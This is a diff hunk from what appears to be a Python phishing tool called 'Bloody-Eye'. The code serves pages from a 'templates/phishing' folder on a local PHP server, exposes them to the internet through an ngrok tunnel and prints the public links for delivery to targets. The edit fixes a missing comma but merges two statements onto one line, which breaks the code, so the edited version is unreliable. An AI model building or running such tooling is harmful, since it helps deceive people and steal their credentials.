@@ -544,13 +544,12 @@ exit();""")
     print("")
     def ngrokserver():
        with open("log","w") as phplog:
-          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing")stderr=phplog,stdout=phplog)
+          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
        bannner.banner()
        global token
        a = ngrok.connect(6060,"http",auth_token=token)
        print("\n"+Fore.RED+" [~] URL 1 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://").replace("-> https://localhost:6060",""))
-       print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> https://localhost:6060",""))
-    v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
+       print("\n"+Fore.RED+" [~] URL 2 : "+Fore.BLUE+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> https://localhost:6060",""))    v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
       phpserver()
       print("")
